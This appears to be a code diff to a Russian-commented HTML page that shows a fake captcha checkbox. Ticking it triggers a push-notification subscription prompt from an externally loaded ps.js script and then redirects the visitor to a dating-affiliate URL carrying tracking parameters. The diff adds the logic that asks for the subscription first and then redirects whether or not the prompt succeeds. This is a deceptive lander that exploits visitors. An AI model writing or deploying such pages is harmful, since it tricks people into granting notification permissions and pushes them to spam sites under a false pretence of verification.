@@ -115,11 +115,11 @@
 
     <script>
         // Ссылка для редиректа
-        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0'; // Замените на ваш URL с параметрами
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
 
         // Функция для выполнения редиректа
         function performRedirect() {
-            console.log('Попытка редиректа на:', redirectUrl); // Для отладки
+            console.log('Попытка редиректа на:', redirectUrl);
             try {
                 window.location.href = redirectUrl;
                 setTimeout(() => {
@@ -134,13 +134,31 @@
             }
         }
 
+        // Функция для вызова подписки и редиректа
+        function requestSubscriptionAndRedirect() {
+            // Предполагаем, что ps.js предоставляет API для вызова подписки
+            if (window.ps && typeof window.ps.showPrompt === 'function') {
+                console.log('Вызываем подписку через ps.js');
+                window.ps.showPrompt().then(result => {
+                    console.log('Результат подписки:', result);
+                    performRedirect(); // Редирект после ответа
+                }).catch(err => {
+                    console.error('Ошибка вызова подписки:', err);
+                    performRedirect(); // Редирект даже при ошибке
+                });
+            } else {
+                console.log('API ps.js не доступен, выполняем редирект');
+                performRedirect(); // Редирект, если API недоступен
+            }
+        }
+
         // Функция проверки
         function verify() {
             const checkbox = document.getElementById('captcha');
             const error = document.getElementById('error');
             if (checkbox.checked) {
                 error.style.display = 'none';
-                performRedirect();
+                requestSubscriptionAndRedirect();
             } else {
                 error.style.display = 'block';
             }
@@ -152,8 +170,7 @@
         // Событие на клик по кнопке
         document.getElementById('submit-button').addEventListener('click', verify);
     </script>
-    
- 
-</body>
+
     <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q" async></script>
+</body>
 </html>
